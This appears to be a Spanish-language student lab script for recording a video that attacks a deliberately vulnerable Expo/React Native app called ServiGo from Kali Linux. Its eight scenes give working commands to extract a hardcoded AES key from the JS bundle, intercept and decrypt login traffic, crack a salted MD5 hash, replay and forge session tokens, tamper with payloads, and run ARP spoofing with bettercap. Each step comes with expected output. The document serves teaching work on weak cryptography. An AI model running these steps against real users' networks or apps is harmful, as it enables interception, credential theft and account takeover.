# KALI_GUIA — Lab "Criptografía Insuficiente" · Ejecución desde Kali (video)

**App:** ServiGo (React Native/Expo) corriendo en Expo Go (iPhone) · **Backend:** `http://<IP_PC>:5000`
**Objetivo del video:** 8 escenas en orden mostrando **detección** de la vulnerabilidad y **acceso** a los datos.
**Duración objetivo:** 10–12 min. Terminal de Kali siempre visible; el celular se muestra en pantalla (cámara o grabación de pantalla del iPhone).

> Variables usadas abajo:
> - `<PC>` = IP del PC Windows con Metro + backend (hoy `192.168.100.11` — verifica con `ipconfig`)
> - `<KALI>` = IP de Kali (verifica con `ip a`)
> - `<IPHONE>` = IP del iPhone (la da la escena 1)
> - **Clave AES:** `Serv1Go#2026Key!` → hex `5365727631476f23323032364b657921`
> - **Salt MD5:** `SG-Parcial-2026:`

**Preparación previa:** seguir `SETUP_CHECKLIST.md` (backend + Metro arriba, Kali con herramientas, iPhone en la misma WiFi).

---

## Verificación rápida antes de grabar

```bash
# En Kali:
curl -s http://<PC>:5000/health        # {"ok":true,"service":"servigo-auth"...}
curl -sI http://<PC>:8081/ | head -3   # HTTP 200 (Metro)
# En el iPhone: la app carga en Expo Go y el login con cliente@test.com/123456 funciona.
```

Si el login falla con "No se pudo contactar el servidor": backend apagado o firewall (ver checklist).

---

## ESCENA 1 — Reconocimiento de red (detección de superficie)

**Objetivo:** descubrir la PC atacable (Metro + API) y el iPhone en la red.

```bash
ip a | grep inet
# → <KALI>/24 en la interfaz puente (eth0/enp0s3)

nmap -sn 192.168.100.0/24
# → lista de hosts: <PC> (Windows), <IPHONE> (Apple), <KALI>

nmap -sV -p 8081,5000 <PC>
# → 8081/tcp open  http   Express (Metro/Expo dev server)
# → 5000/tcp open  http   (nuestra API — Node.js http)
```

**Narración:** "identifico dos servicios web en la PC víctima: el servidor de desarrollo de Expo (8081) y una API (5000) sobre HTTP."

---

## ESCENA 2 — Detección estática: clave y algoritmos en el bundle JS (CWE-321/327/328)

**Objetivo:** bajar el código JavaScript que ejecuta la app desde Metro y extraer la clave AES hardcodeada + salt MD5 + algoritmos.

```bash
# 2.1 Manifest del proyecto (dev server de Expo):
curl -s http://<PC>:8081/ -H 'expo-platform: ios' -H 'Accept: application/expo+json' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['launchAsset']['url'])"
# → http://<PC>:8081/node_modules/expo-router/entry.bundle?platform=ios&dev=true&...&transform.bytecode=1&...

URL=$(curl -s http://<PC>:8081/ -H 'expo-platform: ios' -H 'Accept: application/expo+json' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['launchAsset']['url'])")

# 2.2 Descargar el bundle de la app:
curl -s "$URL" -o /tmp/bundle.js
ls -la /tmp/bundle.js          # ~7 MB

# 2.3 Buscar la clave y constantes de cripto:
grep -n 'SECRET_KEY' /tmp/bundle.js | head -3
grep -o "Serv1Go[^']*" /tmp/bundle.js
grep -o 'SG-Parcial-2026:[^"]*' /tmp/bundle.js | head -1
grep -n 'CryptoJS.mode.ECB' /tmp/bundle.js | head -3
```

**Salida esperada (verificada):**

```text
165524: var SECRET_KEY = 'Serv1Go#2026Key!'; // exactamente 16 bytes -> AES-128
165525: var MD5_SALT = 'SG-Parcial-2026:'; // salt fija hardcodeada
170105: CryptoJS.mode.ECB = function () {
Serv1Go#2026Key!
SG-Parcial-2026:
```

**Narración:** "la app cifra con AES-128 **en modo ECB** y la clave está **embebida en el código fuente** (CWE-321); las contraseñas se resumen con **MD5** y salt fija (CWE-328)."

> Nota: si el bundle sale en formato binario Hermes, `grep -a 'Serv1Go' /tmp/bundle.js` igual lo encuentra (las cadenas quedan en claro).

---

## ESCENA 3 — Detección dinámica: interceptar el tráfico de login (CWE-319)

**Objetivo:** ver que login y re-sincronización de sesión viajan por **HTTP plano** con payload "cifrado".

```bash
# 3.1 Iniciar proxy (terminal de Kali, dejar corriendo):
mitmdump -p 8080 -w /tmp/app.flow
```

**En el iPhone (mostrar en video):** Ajustes → Wi-Fi → (red conectada) → *Configurar proxy* → **Manual** → Servidor `<KALI>`, Puerto `8080` → Guardar. Volver a la app.

**En la app (mostrar en video):**
1. Login con `cliente@test.com` / `123456` (botón Demo 1-Tap) → *Ingresar al Sistema*.
2. Cerrar Expo Go y volver a abrirlo (dispara la **re-sincronización de sesión**).
3. En Kali: `Ctrl+C` en mitmdump.

```bash
# 3.2 Revisar lo capturado:
mitmdump -r /tmp/app.flow | tee /tmp/flows.txt
grep -B2 -A8 'api/login' /tmp/flows.txt | head -40
grep -c 'api/session/refresh' /tmp/flows.txt   # ≥1 si se reabrió la app

# 3.3 Extraer el payload cifrado del login:
grep -o '"payload":"[^"]*"' /tmp/flows.txt | head -1 | cut -d'"' -f4 > /tmp/payload.b64
wc -c /tmp/payload.b64          # ~2900 caracteres
```

**Narración:** "no hay TLS: el login viaja como `POST http://.../api/login` con un cuerpo base64 (CWE-319). El cifrado es solo la capa débil que voy a romper."

---

## ESCENA 4 — ACCESO A: descifrar el payload y extraer la PII (CWE-327)

**Objetivo:** romper el AES-ECB con la clave hallada en la escena 2 y exponer los datos del usuario.

```bash
# 4.1 Convertir clave a hex (o usar el valor directo):
echo -n 'Serv1Go#2026Key!' | xxd -p | tr -d '\n'; echo
# → 5365727631476f23323032364b657921

# 4.2 Descifrar:
base64 -d /tmp/payload.b64 > /tmp/payload.enc
openssl enc -aes-128-ecb -d -K 5365727631476f23323032364b657921 \
  -in /tmp/payload.enc -out /tmp/payload.json
cat /tmp/payload.json | python3 -m json.tool
```

**Salida esperada (verificada):**

```json
{
    "action": "login",
    "email": "cliente@test.com",
    "passwordHash": "19525d22b8d082bcfeb5017de68f8171",
    "role": "CLIENT",
    "user": {
        "name": "Laura Vanessa Gómez",
        "phone": "+57 300 456 7890",
        "address": "Calle 7 # 12-45, Barrio Centro, Riohacha",
        "latitude": 11.5445,
        "longitude": -72.907,
        ...
    },
    "ts": ...
}
```

```bash
# 4.3 Demostración de que ECB es determinista (sin IV/aleatoriedad — CWE-329):
echo -n 'ServiGo Riohacha' | openssl enc -aes-128-ecb -K 5365727631476f23323032364b657921 | xxd
echo -n 'ServiGo Riohacha' | openssl enc -aes-128-ecb -K 5365727631476f23323032364b657921 | xxd
# → ambos idénticos byte a byte (mismo texto = mismo cifrado)
```

**Narración:** "PII completa en claro: nombre, teléfono, dirección, coordenadas GPS… y el hash de la contraseña. ECB sin IV hace que el mismo mensaje cifre igual siempre."

---

## ESCENA 5 — Identificar y crackear el hash (CWE-328)

**Objetivo:** identificar el hash y recuperar la contraseña.

```bash
# 5.1 Identificar:
HASH=$(grep -o 'passwordHash":"[^"]*' /tmp/payload.json | cut -d'"' -f3)
echo $HASH      # 19525d22b8d082bcfeb5017de68f8171
hash-identifier <<< "$HASH"
# → respuestas: MD5 (GNU) / MD4 / ... → elegir MD5

# 5.2 La salt también estaba en el bundle (escena 2):
SALT='SG-Parcial-2026:'
echo "${HASH}:${SALT}" > /tmp/hash.txt
cat /tmp/hash.txt    # hash:salt

# 5.3 Diccionario (rockyou):
sudo gunzip -kf /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
hashcat -m 20 -a 0 -D 1 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 20 /tmp/hash.txt --show
# → 19525d22b8d082bcfeb5017de68f8171:SG-Parcial-2026::123456
```

**Alternativa con Python si hashcat falla:**

```bash
python3 - <<'EOF'
import hashlib
h='19525d22b8d082bcfeb5017de68f8171'; salt='SG-Parcial-2026:'
for line in open('/usr/share/wordlists/rockyou.txt', errors='ignore'):
    p=line.strip()
    if hashlib.md5((salt+p).encode()).hexdigest()==h:
        print('CONTRASEÑA:', p); break
EOF
# → CONTRASEÑA: 123456
```

**Narración:** "MD5 con salt fija es trivialmente reversible con diccionario: contraseña `123456` recuperada."

---

## ESCENA 6 — ACCESO B: replay de sesión y token forjado (account takeover)

**Objetivo:** usar lo robado para entrar **como la víctima** desde Kali.

```bash
# 6.1 Reenviar el payload capturado (replay — el servidor no valida antigüedad/nonce):
PAY=$(cat /tmp/payload.b64)
curl -s -X POST http://<PC>:5000/api/login \
  -H 'Content-Type: application/json' \
  -d "{\"payload\":\"$PAY\"}" | tee /tmp/login_resp.json
# → {"token":"eyJ...","profile":{...},"message":"Autenticación exitosa"}

# 6.2 Extraer token y acceder al perfil de la víctima:
TOKEN=$(python3 -c "import json;print(json.load(open('/tmp/login_resp.json'))['token'])")
curl -s http://<PC>:5000/api/profile -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# → profile con name/phone/address/gps de Laura Vanessa Gómez

# 6.3 El token es solo base64 (sin firma — CWE-330):
echo "$TOKEN" | base64 -d; echo
# → {"email":"cliente@test.com","role":"CLIENT","iat":...}

# 6.4 Forjar un token desde cero (ni siquiera hace falta el replay):
FORGED=$(printf '{"email":"cliente@test.com","role":"CLIENT"}' | base64 -w0)
curl -s http://<PC>:5000/api/profile -H "Authorization: Bearer $FORGED" | python3 -m json.tool
# → el servidor entrega el perfil: autenticación rota
```

**Narración:** "cuenta tomada: reenvío el mismo payload y el servidor emite un token; además el token es base64 sin firma, así que puedo forjarlo desde cero."

---

## ESCENA 7 — ACCESO C: tampering del payload (integridad rota)

**Objetivo:** modificar los datos con la clave robada y que el servidor los acepte.

```bash
python3 - <<'EOF'
import json
d = json.load(open('/tmp/payload.json'))
d['user']['address'] = 'Calle Falsa 123 (modificada por el atacante)'
json.dump(d, open('/tmp/payload_tam.json','w'))
EOF

openssl enc -aes-128-ecb -e -K 5365727631476f23323032364b657921 \
  -in /tmp/payload_tam.json -out /tmp/payload_tam.enc
TAM=$(base64 -w0 /tmp/payload_tam.enc)

curl -s -X POST http://<PC>:5000/api/login -H 'Content-Type: application/json' \
  -d "{\"payload\":\"$TAM\"}" -o /tmp/r2.json
TOKEN2=$(python3 -c "import json;print(json.load(open('/tmp/r2.json'))['token'])")
curl -s http://<PC>:5000/api/profile -H "Authorization: Bearer $TOKEN2" | python3 -m json.tool
# → "address": "Calle Falsa 123 (modificada por el atacante)"
```

**Narración:** "sin ninguna clave del servidor ni validación de integridad, altero la dirección y el backend la persiste y la devuelve."

---

## ESCENA 8 (BONUS) — MITM activo por ARP sin tocar el iPhone

**Objetivo:** capturar el mismo tráfico **sin** configurar proxy en el dispositivo (envenenamiento ARP). *Opcional: depende del punto de acceso.*

```bash
# 8.1 Gateway y víctima:
ip r | grep default
IPHONE=<IPHONE>     # de la escena 1 (nmap -sn)

# 8.2 Sniff en una terminal:
sudo tcpdump -i eth0 -A -s0 'tcp port 5000 and host <PC>' | tee /tmp/sniff.txt

# 8.3 Spoof en otra terminal (interfaz según `ip a`):
sudo bettercap -iface eth0 -eval "set arp.spoof.targets $IPHONE; arp.spoof on; net.sniff on"

# 8.4 En el iPhone: desactivar el proxy (Ajustes → Wi-Fi → proxy → Desactivar)
#     y reintentar login en la app → en tcpdump aparece:
#     POST /api/login HTTP/1.1 ... {"payload":"3rIFydU5..."}
```

```bash
# 8.5 Extraer desde el sniff (mismo pipeline de la escena 4):
grep -o '"payload":"[^"]*"' /tmp/sniff.txt | head -1 | cut -d'"' -f4 > /tmp/payload2.b64
base64 -d /tmp/payload2.b64 | openssl enc -aes-128-ecb -d \
  -K 5365727631476f23323032364b657921 | python3 -m json.tool
```

**Narración:** "misma captura sin configura nada en el dispositivo: ARP spoof + sniff en claro." `Ctrl+C` en bettercap para terminar.

> Si el AP aísla clientes y no captura nada, omite la escena 8 en el video (las 1–7 son suficientes).

---

## Troubleshooting

| Sintoma | Solución |
|---|---|
| `curl` al manifest da HTML en vez de JSON | Faltan los headers `-H 'expo-platform: ios' -H 'Accept: application/expo+json'` |
| Puertos 8081 y 8082 abiertos | Hay 2 Metros; usa el del checklist (ideal: solo uno corriendo, 8081) |
| mitmdump no captura nada | Verifica proxy del iPhone apuntando a `<KALI>:8080`; `curl -x http://<KALI>:8080 http://<PC>:5000/health` desde Kali para probar |
| Login en la app: "No se pudo contactar el servidor" | Backend apagado o firewall (reglas 8081/5000) — ver SETUP_CHECKLIST |
| `hashcat` no arranca | Usa el fallback Python (escena 5) |
| rockyou no existe | `sudo gunzip -kf /usr/share/wordlists/rockyou.txt.gz` |
| El iPhone no ve el PC | Misma WiFi; desactiva VPN; `curl http://<PC>:5000/health` desde el navegador del iPhone |
| IP del PC cambió | Actualiza `<PC>` en todos los comandos; si la app no conecta, revisa `FALLBACK_HOST` en `src/config.ts` |

---

## Checklist de grabación (antes de exportar el video)

- [ ] Escena 1 con `nmap -sn` + `nmap -sV` visibles
- [ ] Escena 2 con el `grep` mostrando `Serv1Go#2026Key!`
- [ ] Escena 3 con mitmdump corriendo **y** el iPhone con proxy configurado (mostrar ambos)
- [ ] Escena 4 con el JSON descifrado mostrando teléfono/dirección/GPS
- [ ] Escena 5 con `hashcat --show` (o Python) mostrando `123456`
- [ ] Escena 6 con `curl` al perfil + token decodificado + token forjado
- [ ] Escena 7 con la dirección alterada en la respuesta
- [ ] Escena 8 (si aplica) con paquetes en tcpdump
- [ ] Al final: quitar el proxy del iPhone (**Ajustes → Wi-Fi → proxy → Desactivar**)
- [ ] Terminal de Kali legible (fuente ≥16), sin datos de terceros ajenos al lab
